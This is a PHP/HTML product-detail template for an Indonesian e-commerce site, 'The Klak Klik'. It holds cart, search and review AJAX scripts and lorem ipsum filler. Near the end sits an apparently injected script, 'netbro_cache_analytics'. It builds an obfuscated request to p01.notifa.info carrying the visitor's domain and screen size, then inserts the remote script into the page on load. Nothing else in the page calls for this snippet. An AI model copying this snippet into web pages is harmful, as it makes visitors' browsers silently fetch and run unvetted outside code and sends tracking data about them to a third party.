<!DOCTYPE html>
<html lang="en">
    
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>

        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
                <meta name="author" content="BDTASK">
        <meta name="description" content="">

        <title>The Klak Klik : DETAIL BARANG</title>
   
        <!-- Favicons --> 
        <link rel="icon" type="image/png" href="<?php echo base_url().'my-assets/image/logo/b561929d20e2e5728e05d4f0bbafe7f7.png'?>">
        
        <!-- Bootstrap core CSS -->
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
        <!-- Bootstrap core CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/bootstrap/css/bootstrap.min.css'?>" rel="stylesheet">  
        
        <!-- FontAwesome Icon CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/font-awesome/css/font-awesome.min.css'?>" rel="stylesheet" type="text/css"> 
        
        <!-- Jquery UI CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/jquery-ui/jquery-ui.min.css'?>" rel="stylesheet"> 
        
        <!-- Owl Carousel CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/owl-carousel/owl.carousel.min.css'?>" rel="stylesheet">
        
        <!-- Animate CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/wow-js/animate.css'?>" rel="stylesheet"> 
        
        <!-- Lightbox CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/lightbox/css/lightbox.min.css'?>" rel="stylesheet"> 

        <!-- Custom styles for this template -->
        <link href="<?php echo base_url().'assets/website/css/style.css'?>" rel="stylesheet"> 
        <!-- EasyZoom CSS -->
        <link rel="stylesheet" href="<?php echo base_url().'assets/website/vendor/easyzoom/easyzoom.min.css'?>">

        <!-- Responsive Style -->
        <link href="<?php echo base_url().'assets/website/css/responsive.css'?>" rel="stylesheet">

        <!-- Include SmartWizard CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/css/smart_wizard.css'?>" rel="stylesheet" type="text/css">

        <!-- Optional SmartWizard theme -->
        <link href="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/css/smart_wizard_theme_dots.css'?>" rel="stylesheet" type="text/css">

        <!-- Jquery  -->
        <script src="<?php echo base_url().'assets/website/vendor/jquery/jquery-3.2.1.min.js'?>" type="text/javascript"></script>

        <!-- jquery-ui.min.js -->
        <script src="<?php echo base_url().'assets/website/vendor/jquery-ui/jquery-ui.min.js'?>" type="text/javascript"></script>
        
        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->

     
    
    </head>

    <body>
        <!--==== Preloader =======-->
        <div class="preloader"></div>

        <!--========== Header Top Area ==========-->
       <?php      $this->load->view('header_top');             ?> 
        <!--========== End Header Top Area ==========-->
        
        <!--====== Header Area ======-->
<header>
    <!-- Main Header Area -->
   <?php      $this->load->view('header_main');             ?> 
    

    <!-- header bottom start -->
<?php     /* $this->load->view('header');  */           ?> 
    <!-- header bottom end -->
</header>
<!--===== End Header Area =======-->

    <style type="text/css">
        input.loading {
            background: #fff url(assets/website/image/resize.gif) no-repeat center !important;
        }
    </style>

    <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
        
        //Product search by product name
        $('body').on('keyup', '#product_name', function() {

            var product_name = $('#product_name').val();
            var category_id  = $('#select_category').val();

            //Product name check
            if (product_name == 0) {
                $('.search_results').html(' ');
                return false;
            }
            
            $.ajax({
                type: "post",
                async: false,
                url: 'http://isshue.bdtask.com/isshue-v1.5/website/Category/category_product_search_ajax',
                data: {product_name: product_name,category_id:category_id},
                beforeSend: function(){
                    $('#product_name').addClass('loading');
                },
                success: function(data) {
                    $('#product_name').removeClass('loading');
                    if (data) {
                        $('.search_results').html(data);
                    }
                },
                error: function() {
                    alert('Request Failed, Please check your code and try again!');
                }
            });
        });
    </script>

<!-- Product delete from cart by ajax -->
<script type="text/javascript">
    $('body').on('click', '.delete_cart_item', function() {
        var row_id  = $(this).attr('name');
        $.ajax({
            type: "post",
            async: true,
            url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/delete_cart/',
            data: {row_id:row_id},
            success: function(data) {
                $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
            },
            error: function() {
                alert('Request Failed, Please check your code and try again!');
            }
        });
    });  
</script>           


<!--contentt-->
<?php foreach ($produk_detail as $data): ?>


    <section id="default" class="product_details">
    <div class="container">
        <div class="row product_details_inner">
            <div class="col-md-6 col-sm-12">
                <!--========== Product zoom Area ==========-->
                <div class="row m0 product_zoom">
                    <!-- Tab panes -->
                    <ul class="nav nav-pills order-2 order-md-1" role="tablist">
                        <li class="nav-item">
                            <a class="nav-link active" data-toggle="tab" href="#product1" role="tab">
                                <img src="<?php echo base_url()?>my-assets/image/product/<?php echo $data['gambar_produk']; ?>" alt="<?php echo $data['gambar_produk']; ?>" style="height:  80px;width:  80px;">
                            </a>
                            <input type="hidden" name="image" id="image" value="../../isshue-v1.1/my-assets/image/product/thumb/c6d88bcf8196a189015e772151197ab6.jpg">
                        </li>
                                            </ul>
                    <div class="tab-content order-1 order-md-2">
                        <div class="tab-pane active" id="product1" role="tabpanel">
                            <div class="easyzoom easyzoom--adjacent">
                                <a href="<?php echo base_url()?>my-assets/image/product/<?php echo $data['gambar_produk']; ?>">
                                    <img style="min-height: 333px;" src="<?php echo base_url()?>my-assets/image/product/<?php echo $data['gambar_produk']; ?>" alt="<?php echo $data['gambar_produk']; ?>">
                                </a>
                            </div>
                        </div>
                                            </div>
                    <!-- Nav tabs -->
                    
                </div>
                <!--======== End Product zoom Area ========-->      
            </div>
            <div class="col-md-6 col-sm-12">
                <div class="row db m0 product_info">
                    <ol class="breadcrumb m0 p0">
                        <li class="breadcrumb-item"><a href="#">Home</a></li>
                        <li class="breadcrumb-item"><a href="../category_product/2BWYSR8D7XL4ORD.html">COMPUTING & GAMING</a></li>
                        <li class="breadcrumb-item active">Mackbook</li>
                    </ol>



                        
                    <h2><?php echo $data['nama_produk']; ?></h2>
                    <div class="product_cost">
                           <div class="previous">
                                <del>
                                                   <?php rupiah($data['harga']); ?>
                                </del>

                                <input type="hidden" id="discount" name="discount" value="-390">
                            </div>
                            <div class="current">
                                <p>
                                   <?php rupiah($data['harga']); ?>
                                       
                                </p>

                                <input type="hidden" id="price" name="price" value="<?php echo $data['harga']; ?>">
                            </div>
                            
                        </div>
                    <input type="hidden" name="name" id="name" value="Mackbook">
                    
                                        <p class="about_product"><?php echo $data['short_deskripsi']; ?></p>
                                        <div class="product_type">
                        
                        

                        <input type="hidden" name="model" id="model" value="Mackbook">
                    </div>

                    
                                        
                                        
                
                
                    <div class="cart_counter" style="border:1px solid; padding:2px; border-radius:5px; ">
                       
                     
                        <button onclick="var result = document.getElementById('sst'); var sst = result.value; if( !isNaN( sst ) &amp;&amp; sst > 1 ) result.value--;return false;" class="reduced items-count" type="button">
                            <i class="fa fa-minus"></i>
                        </button>

                        <input type="text" name="qty" id="sst" maxlength="12" value="1" title="Qnty" class="input-text qty" min="1" max="2" style="max-width:30px;">

                        <button onclick="var result = document.getElementById('sst'); var sst = result.value; if( !isNaN( sst )) result.value++;return false;" class="increase items-count" type="button">
                            <i style="border:0;" class="fa fa-plus"></i>
                        </button>
                        
                    </div> 
                    <button type="button" data-produkid="<?php echo $data['id'] ?>" data-produknama="<?php echo $data['nama_produk'] ?>" data-produkharga="<?php echo $data['harga'] ?>" data-gambar="<?php echo $data['gambar_produk']; ?>" class="add_cart btn button_add_chart"><i class="fa fa-shopping-cart"></i>  Add to Chart/Queue</button>
                        
                    <input type="hidden" id="product_id" name="product_id" value="11121745">
                    
                    <div class=""  style="padding-top: 34px;">
                        <span class="share-title"><b> Category : </b> <i class="color-gray">

                        <?php foreach ($kategori_detail as $kategori_detail ): ?>
                            <?php echo $kategori_detail['nama_kategori'];?>
                        <?php endforeach ?>
                            
                        </i> </span>
                    
                    </div>
                    <div class="">
                        <span class="share-title"><b>Tags : </b></span>


                        <?php $tags = $data['tags']; 
                        $tags_explode = explode(",",$tags);

                        $jumlahtags = count($tags_explode);

                        $index = 1; 
                        foreach ($tags_explode as $tags_explode ) :
                        ?> 

                        <a class="color-gray" href="<?php echo base_url().'katalog/tags/' ?><?php echo $tags_explode;?>"><?php echo $tags_explode;?> </a>
                        <?php $index++; if($index<=$jumlahtags) echo ','; ?>


                        <?php endforeach ?>
                    
                    </div>
                    
                    <div class="product_share">
                        <span class="share-title">Share : </span>
                        <ul class="social-icons">
                            <li>
                                <a class="share-button" data-share-url="http://isshue.bdtask.com/isshue-v1.5/product_details/11121745" data-share-network="facebook" data-share-text="Share this awesome link on Facebook" data-share-title="Facebook Share" data-share-via="" data-share-tags="" data-share-media="" href="#"><i class="fa fa-facebook"></i></a>
                            </li>
                            <li>
                                <a class="share-button" data-share-url="http://isshue.bdtask.com/isshue-v1.5/product_details/11121745" data-share-network="twitter" data-share-text="Share this awesome link on Twitter" data-share-title="Twitter Share" data-share-via="" data-share-tags="" data-share-media="" href="#"><i class="fa fa-twitter"></i></a>
                            </li>
                            <li>
                                <a class="share-button" data-share-url="http://isshue.bdtask.com/isshue-v1.5/product_details/11121745" data-share-network="googleplus" data-share-text="Share this awesome link on Google+" data-share-title="Google+ Share" data-share-via="" data-share-tags="" data-share-media="" href="#"><i class="fa fa-google-plus"></i></a>
                            </li>
                            <li>
                                <a class="share-button" data-share-url="http://isshue.bdtask.com/isshue-v1.5/product_details/11121745" data-share-network="linkedin" data-share-text="Share this awesome link on LinkedIn" data-share-title="LinkedIn Share" data-share-via="" data-share-tags="" data-share-media="" href="#"><i class="fa fa-linkedin"></i></a>
                            </li>
                            <li>
                                <a class="share-button" data-share-url="http://isshue.bdtask.com/isshue-v1.5/product_details/11121745" data-share-network="pinterest" data-share-text="Share this awesome link on Pinterest" data-share-title="Pinterest Share" data-share-via="" data-share-tags="" data-share-media="" href="#"><i class="fa fa-pinterest"></i></a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>
<!--========== Product Review Area ==========-->
<section class="product_review_area">
    <div class="container">
        <div class="row m0 db product_review">
            <!-- Nav tabs -->
            <ul class="nav nav-pills" role="tablist">
                <li class="nav-item">
                    <a class="nav-link active" data-toggle="tab" href="#reviews" role="tab">Specifications</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" data-toggle="tab" href="#description" role="tab">Description</a>
                </li>
               <!--  <li class="nav-item">
                    <a class="nav-link" data-toggle="tab" href="#tags" role="tab">Tag</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" data-toggle="tab" href="#specifications" role="tab">Specifications</a>
                </li> -->
            </ul>

            <!-- Tab panes -->
            <div class="tab-content">
                <div class="tab-pane active" id="reviews" role="tabpanel">
                    <div class="review_form row">
                                                <div class="col-md-12 text-center " >
                            <div class="row m0 db need_review">
                                <p><span xss=removed>
                                   <center><img src="https://www.researchgate.net/profile/M_Amin8/publication/280940452/figure/tbl2/AS:391748175056896@1470411451044/Antenna-Specification-Specification-Values.png">
                                    </center>
                                    </span>                               
                                    <br>
                                </p>
                            </div>
                        </div>
                                               <!-- <div class="col-md-6">
                            <div class="review_message">
                                <h3>Review This Product</h3>
                                <div class="star_part">
                                    <span>    
                                        <a class="star-1" href="javascript:void(0)" name="1">
                                            <i class="fa fa-star"></i>
                                        </a>
                                        <a class="star-2" href="javascript:void(0)" name="2">
                                            <i class="fa fa-star"></i>
                                            <i class="fa fa-star"></i>
                                        </a>
                                        <a class="star-3 active" href="javascript:void(0)" name="3">
                                            <i class="fa fa-star"></i>
                                            <i class="fa fa-star"></i>
                                            <i class="fa fa-star"></i>
                                        </a>
                                        <a class="star-4" href="javascript:void(0)" name="4">
                                            <i class="fa fa-star"></i>
                                            <i class="fa fa-star"></i>
                                            <i class="fa fa-star"></i>
                                            <i class="fa fa-star"></i>
                                        </a>
                                        <a class="star-5" href="javascript:void(0)" name="5">
                                            <i class="fa fa-star"></i>
                                            <i class="fa fa-star"></i>
                                            <i class="fa fa-star"></i>
                                            <i class="fa fa-star"></i>
                                            <i class="fa fa-star"></i>
                                        </a>
                                    </span>
                                </div>
                                <div class="row msg_part">
                                    <div class="col-md-12">
                                        <textarea class="form-control" placeholder="Your Message" id="review_msg"></textarea>
                                    </div>
                                    <div class="col-md-12">
                                        <a href="javascript:void(0)" class="review">Submit</a>
                                    </div>
                                </div>
                            </div>
                        </div>-->
                    </div>
                </div>
                <div class="tab-pane" id="description" role="tabpanel">
                    <div class="row">
                        <p><span xss=removed>It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout. The point of using Lorem Ipsum is that it has a more-or-less normal distribution of letters, as opposed to using 'Content here, content here', making it look like readable English. Many desktop publishing packages and web page editors now use Lorem Ipsum as their default model text, and a search for 'lorem ipsum' will uncover many web sites still in their infancy.</span><br></p>                    </div>
                </div>
                <div class="tab-pane" id="tags" role="tabpanel">
                                        <a href="#" class="nav">gthd</a>
                                        <a href="#" class="nav">hdhd</a>
                                    </div>
                <div class="tab-pane" id="specifications" role="tabpanel">
                     <div class="row">
                        <p><span xss=removed>It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout. The point of using Lorem Ipsum is that it has a more-or-less normal distribution of letters, as opposed to using 'Content here, content here', making it look like readable English. Many desktop publishing packages and web page editors now use Lorem Ipsum as their default model text, and a search for 'lorem ipsum' will uncover many web sites still in their infancy.</span><br></p>                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

                    <?php endforeach ?>

<!--========= End Product Review Area =========-->

<!-- Rating or review product -->
<script type="text/javascript">
    $(document).ready(function(){
        $('.star_part a').click(function(){
            $('.star_part a').removeClass("active");
            $(this).addClass("active");
        });


        //Add review
        $('body').on('click', '.review', function() {

            var product_id  = '11121745';
            var review_msg  = $('#review_msg').val();
            var customer_id = '';
            var rate        = $('.star_part a.active').attr('name');

            //Review msg check
            if (review_msg == 0) {
                alert('Please write your comment.');
                return false;
            }

            //Customer id check
            if (customer_id == 0) {
                alert('Please login first !');
                return false;
            }

            $.ajax({
                type: "post",
                async: true,
                url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/add_review',
                data: {product_id:product_id,customer_id:customer_id,review_msg:review_msg,rate:rate},
                success: function(data) {
                    if (data == '1') {
                        $('#review_msg').val('');
                        alert('Your review added.');
                        window.load();
                    }else if(data == '2'){
                        $('#review_msg').val('');
                        alert('Thanks.You already reviewed.');
                        window.load();
                    }else if(data == '3'){
                        $('#review_msg').val('');
                        alert('Please login first !');
                        window.load();
                    }
                },
                error: function() {
                    alert('Request Failed, Please check your code and try again!');
                }
            });
        });
    });
</script>

<!--========== Electronics Product Area ==========-->
<section class="product_area wow fadeInUp">
    <div class="container">
        <div class="row db m0 product_inner">
            <div class="heading">
                <h2 class="bg_gray">Related Products</h2>
            </div>
            <div class="owl-carousel product_slider slider_style">
            <?php foreach ($related_produk as $related): ?>
                <div class="item">
                <center> 
                    <h6><?php echo $related['nama_produk']; ?></h6> 
                </center><!--sku-->
                        <div class="item_inner">
                            <div class="item_image">
                                <a href="<?php echo base_url().'detail_produk/id_produk/';?><?php echo $related['id']; ?>">
                                    <img src="https://www.coleka.com/media/item/201707/13/pop-marvel-new-item.jpg" alt="product-image">
                                </a>
                            </div>  
                            <div class="item_info">
                                <h6><?php echo $related['nama_produk']; ?><br/><!--sku-->
                                3P 4500A 400VAC<br/>
                                SNI</h6>



                                <div class="product_cost">
                                    <p class="current">

                                       <?php rupiah($related['harga']); ?>
                                           
                                    </p>
                                   <!-- <p class="previous">
                                        RP.274.000 </p>   Untuk diskon coret harga   -->
                                </div>
                                <div class="addtocard">
                                        <form action="#" method="post">
                                            <input type="hidden" value="1">
                                            <a  href="product_details/56121385.html" style="font-size:15px;">
                                                <button class="cart_button_gray button_add_chart"><i class="fa fa-shopping-cart"></i>  Beli</button>
                                            </a>
                                        </form>
                                    </div>
                                </div>


                        </div>
                    </div>
                <?php endforeach ?>
                             </div>
        </div>
    </div>
</section>
<!-- ========== End Electronics Product Area ========== -->
        
<!----------./content-->
 

<!--=========== footer Area ===========-->
 

        
<!--=========== ./footer Area ===========-->
 <?php      $this->load->view('footer');         

 function rupiah($angka){
    
echo "Rp " . number_format($angka,2,',','.');
    // return $hasil_rupiah;
 
} 
   ?>  

        <!-- Bootstrap  -->
        <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="<?php echo base_url().'assets/website/vendor/bootstrap/js/tether.min.js'?>" type="text/javascript"></script>
        <script src="<?php echo base_url().'assets/website/vendor/bootstrap/js/bootstrap.min.js'?>" type="text/javascript"></script>

        <script type="text/javascript" src="cdnjs.cloudflare.com/ajax/libs/1000hz-bootstrap-validator/0.11.5/validator.min.js'?>"></script>

        <!-- Include SmartWizard JavaScript source -->
        <script type="text/javascript" src="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/js/jquery.smartWizard.min.js'?>"></script>

        <!-- Owl Carousel -->
        <script src="<?php echo base_url().'assets/website/vendor/owl-carousel/owl.carousel.min.js'?>" type="text/javascript"></script>

        <!-- EasyZoom -->
        <script src="<?php echo base_url().'assets/website/vendor/easyzoom/easyzoom.min.js'?>" type="text/javascript"></script>

        <!-- DSCount JS -->
        <script src="<?php echo base_url().'assets/website/vendor/dscountdown/dscountdown.min.js'?>" type="text/javascript"></script>
        
        <!-- WoW js -->
        <script src="<?php echo base_url().'assets/website/vendor/wow-js/wow.min.js'?>"></script>
        
        <!-- Lightbox js -->
        <script src="<?php echo base_url().'assets/website/vendor/lightbox/js/lightbox.min.js'?>"></script>  

        <!-- Simple Share js -->
        <script src="<?php echo base_url().'assets/website/js/jquery.simpleSocialShare.min.js'?>"></script>

        <!-- Custom scripts for this template -->
        <script src="<?php echo base_url().'assets/website/js/theme.js'?>"></script>

    
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mN8SBaYYlsFeUcDpnfQuaKJY%2f%2b4ifx7FXqVglW98PVFQvyY7T5Gk6N3jNgEJBhG6GaIzUqsjF%2f4TLSGOEsYplytwPHPHZFO3%2bR6hyaZOWCDQ8NlS%2b7NVfrYlTPyMtYeFvjQ%2fnLSStYmmFKlaYd%2bcyO0NvOwT%2b9o5NpgZK1gmIGgBQxkfGD%2fb9NYJ5IJVImWu%2fqDBvW%2b9q2qM5N6XydmS8ZLD0HEqy8N%2bx3cr7%2f6jh278SYgwY8uZjHU0e6QkQ1T2jY6I1JON1wBuBdTZDw5sy6dgh7d5LWLX4DVb3zDZPQPk6JEqAaM6yvxHaRlLpKWD5Qpu81O%2bLfziK99WRxo5OJNny1p1UL6OtYYO1GSuVvqfajzEcbbhCo5JXOLkOoUYa84r0WrbrcFiNk5r3M5YfMpXZfbTpbsQhGlXzCd9KuM9lq%2brlrbLdjgDkYGjAsQcXf5g4enwoja3mCiFUt1yIbw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
    
    
    <script type="text/javascript">
            

$('.add_cart').on('click', function () {
        var cart = $('.shopping-cart');
        var imgtodrag = $('.tab-content').find("img").eq(0);
        if (imgtodrag) {
            var imgclone = imgtodrag.clone()
                .offset({
                top: imgtodrag.offset().top,
                left: imgtodrag.offset().left
            })
                .css({
                'opacity': '0.5',
                    'position': 'absolute',
                    'height': '300px',
                    'width': '300px',
                    'z-index': '99999'
            })
                .appendTo($('body'))
                .animate({
                'top': cart.offset().top + 10,
                    'left': cart.offset().left + 10,
                    'width': 75,
                    'height': 75
            }, 1000, 'easeInOutExpo');
            
            setTimeout(function () {
                cart.effect("shake", {
                    times: 2
                }, 200);
            }, 1500);

            imgclone.animate({
                'width': 0,
                    'height': 0
            }, function () {
                $(this).detach()
            });
        }
    });
        </script>


    </body>


</html>